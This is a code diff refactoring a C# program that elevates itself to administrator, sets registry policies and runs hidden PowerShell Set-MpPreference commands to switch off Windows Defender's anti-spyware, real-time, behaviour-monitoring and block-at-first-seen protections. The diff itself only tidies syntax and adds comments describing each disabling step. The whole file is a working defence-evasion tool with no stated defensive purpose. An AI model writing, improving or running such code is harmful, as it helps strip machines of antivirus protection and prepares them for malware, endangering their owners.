@@ -9,19 +9,23 @@ class Program
     {
         if (!IsUserAnAdmin())
         {
-            ProcessStartInfo startInfo = new ProcessStartInfo();
-            startInfo.Verb = "runas";
-            startInfo.FileName = Environment.GetCommandLineArgs()[0];
-            startInfo.Arguments = "/admin";
+            ProcessStartInfo startInfo = new ProcessStartInfo
+            {
+                Verb = "runas",
+                FileName = Environment.GetCommandLineArgs()[0],
+                Arguments = "/admin"
+            };
             Process.Start(startInfo);
             return;
         }
 
         try
         {
+            // Set registry value to disable Windows Defender AntiSpyware
             Registry.SetValue(@"HKEY_LOCAL_MACHINE\SOFTWARE\Policies\Microsoft\Windows Defender", "DisableAntiSpyware", 1, RegistryValueKind.DWord);
 
-            RegistryKey key = Registry.LocalMachine.OpenSubKey(@"SOFTWARE\Policies\Microsoft\Windows Defender\Real-Time Protection", true);
+            // Open registry subkey for Real-Time Protection settings
+            RegistryKey key = Registry.LocalMachine.OpenSubKey(@"SOFTWARE\Policies\Microsoft\Windows Defender\Real-Time Protection", writable: true);
             if (key != null)
             {
                 key.SetValue("DisableBehaviorMonitoring", 1, RegistryValueKind.DWord);
@@ -37,6 +41,7 @@ class Program
             Console.WriteLine("Error: " + ex.Message);
         }
 
+        // Run PowerShell commands to disable various Defender settings
         RunPowerShellCommand("Set-MpPreference -DisableRealtimeMonitoring $true");
         RunPowerShellCommand("Set-MpPreference -DisableBehaviorMonitoring $true");
         RunPowerShellCommand("Set-MpPreference -DisableBlockAtFirstSeen $true");
@@ -52,16 +57,20 @@ class Program
 
     static void RunPowerShellCommand(string command)
     {
-        ProcessStartInfo startInfo = new ProcessStartInfo();
-        startInfo.FileName = "powershell.exe";
-        startInfo.Arguments = $"-Command \"{command}\""; // Use $ to ensure the command is properly formatted
-        startInfo.UseShellExecute = false;
-        startInfo.CreateNoWindow = true;
-        startInfo.RedirectStandardOutput = true;
-        Process process = new Process();
-        process.StartInfo = startInfo;
-        process.Start();
-        process.WaitForExit();
+        ProcessStartInfo startInfo = new ProcessStartInfo
+        {
+            FileName = "powershell.exe",
+            Arguments = $"-Command \"{command}\"",
+            UseShellExecute = false,
+            CreateNoWindow = true,
+            RedirectStandardOutput = true
+        };
+        using (Process process = new Process())
+        {
+            process.StartInfo = startInfo;
+            process.Start();
+            process.WaitForExit();
+        }
     }
 
     static bool IsUserAnAdmin()
